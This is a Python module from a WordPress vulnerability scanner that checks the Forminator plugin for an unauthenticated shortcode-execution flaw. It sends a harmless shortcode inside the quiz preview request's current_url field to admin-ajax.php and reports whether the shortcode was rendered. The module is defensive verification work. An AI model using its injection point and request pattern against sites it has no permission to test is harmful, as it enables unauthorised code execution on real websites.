from __future__ import annotations

import re
import urllib.parse
from typing import Any

from ...core.differential import confirm_shortcode_output, evidence_from
from ...core.http import normalize_url, request
from ...core.models import Finding
from ...core.probes import rand_str
from ...core.transcript import attach_transcript, take_transcript
from .forminator_advisory import COMPONENT, discover_forms, passive_result

CVE_ID = "CVE-2026-92229"
NAME = "Forminator unauthenticated arbitrary shortcode execution"
AFFECTED_RULE = "Forminator <=1.57.2; fixed in 1.57.3"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
# A Forminator-registered shortcode that renders a fixed, harmless error
# message without any attributes. The 1.57.2 quiz renderer evaluates it
# inside the share block built from the attacker-controlled current_url;
# the 1.57.3 input sanitizer strips it before rendering.
PROBE_TAG = "forminator_quiz"
EVAL_MARKER = "Module ID attribute is required!"


def classify_version(version: str | None) -> str:
    from .forminator_advisory import classify_version as classify

    return classify(version, fixed="1.57.3")


def _page_answers_and_nonce(page_url: str, timeout: int, proxy: str | None) -> tuple[dict[str, str], str | None]:
    """Extract quiz answer defaults and the quiz nonce from a rendered page."""
    response = request(page_url, timeout=timeout, proxy=proxy)
    body = str(response.get("body", ""))
    answers: dict[str, str] = {}
    for match in re.finditer(r'name="answers\[([^\]]+)\]"[^>]*value="([^"]*)"', body, re.IGNORECASE):
        field, value = match.group(1), match.group(2)
        if field not in answers:
            answers[field] = value
    nonce = next(
        (
            match.group(1)
            for match in re.finditer(r'name="forminator_nonce" value="([^"]+)"', body, re.IGNORECASE)
            if match.group(1)
        ),
        None,
    )
    if nonce is None:
        generic = re.search(r'name="_wpnonce" value="([^"]+)"', body, re.IGNORECASE)
        nonce = generic.group(1) if generic else None
    return answers, nonce


def _data_url(body: str) -> str | None:
    match = re.search(r'data-url=\\?"(.*?)"', body)
    if not match:
        return None
    return match.group(1).replace("\\/", "/").rstrip("\\")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    target_forms = [
        form for form in discover_forms(target_url, timeout, proxy) if form["has_quiz"] and form["form_ids"]
    ]
    picked: tuple[str, str] | None = None
    for form in target_forms:
        valid_ids = [str(fid) for fid in form["form_ids"] if str(fid) not in ("", "0")]
        if valid_ids:
            picked = (valid_ids[0], form["page_url"])
            break
    if picked is None:
        if not target_forms:
            return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="Forminator is in the affected range, but no anonymously submittable quiz with a discoverable form ID was found. The vulnerable renderer therefore could not be reached safely from outside.", action="Upgrade Forminator to 1.57.3 or newer, and re-test if a public quiz is deployed.")
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="A quiz-like page was found, but no usable numeric form ID could be parsed from its HTML.", action="Upgrade Forminator to 1.57.3 or newer.")
    form_id, page_url = picked
    answers, nonce = _page_answers_and_nonce(page_url, timeout, proxy)
    if not answers:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="A public quiz was found, but no answer inputs could be parsed from its HTML, so the result renderer could not be reached.", action="Upgrade Forminator to 1.57.3 or newer; re-test with a quiz whose answers render as form inputs.")
    marker = f"proofcms{rand_str(8)}"

    def fetch(current_url: str) -> str:
        data: dict[str, Any] = {
            "action": "forminator_submit_preview_form_quizzes",
            "form_id": form_id,
            "current_url": current_url,
            "page_id": "0",
            "form_type": "quizzes",
        }
        for field, value in answers.items():
            data[f"answers[{field}]"] = value
        if nonce:
            data["forminator_nonce"] = nonce
        response = request(
            f"{normalize_url(target_url)}/wp-admin/admin-ajax.php",
            method="POST",
            data=urllib.parse.urlencode(data).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": page_url},
            timeout=timeout,
            proxy=proxy,
        )
        return str(response.get("body", ""))

    outcome = confirm_shortcode_output(
        fetch, _data_url, marker, probe_tag=PROBE_TAG, expected_output=EVAL_MARKER
    )
    reflection = outcome.reflection
    evaluated = outcome.evaluated
    evidence = attach_transcript(
        evidence_from(
            outcome,
            {
                "form_id": form_id,
                "page_url": page_url,
                "answers": answers,
                "preview_action": True,
            },
        ),
        take_transcript(),
    )
    if evaluated:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{normalize_url(target_url)}/wp-admin/admin-ajax.php", detail="The preview quiz renderer evaluated a harmless Forminator shortcode embedded in current_url, rendering its fixed error text into the response. No executable shortcode and no state-changing request were sent, and the preview action stores no entry.", action="Upgrade Forminator to 1.57.3 or newer immediately.", evidence=evidence)
    if reflection is None:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="The quiz result did not render a social share block, so the current_url sink was not observable. Enable share icons on the quiz to make the sink testable.", action="Upgrade Forminator to 1.57.3 or newer.", evidence=evidence)
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="The quiz share block reflected the probe URL, but the embedded shortcode was not evaluated, consistent with the 1.57.3 input sanitizer.", action="Upgrade Forminator to 1.57.3 or newer; no shortcode evaluation was demonstrated.", evidence=evidence)


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(cve=CVE_ID, name=NAME, affected_rule=AFFECTED_RULE, plugins=plugins, fixed="1.57.3", remediation="Upgrade Forminator to 1.57.3 or newer.")
    if not run_exploit_check or exploit_mode != "safe" or passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_versions": ["<=1.57.2"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "module_version": "1.1.0", "last_reviewed": "2026-11-09", "updated": "2026-11-09", "required_detectors": ["detect_wordpress_plugins"], "references": ["https://github.com/advisories/GHSA-2vrv-wr6r-v79v", "https://github.com/murrez/CVE-2026-92229", "https://plugins.trac.wordpress.org/browser/forminator/tags/1.57.2/library/modules/quizzes/front/front-action.php"]}
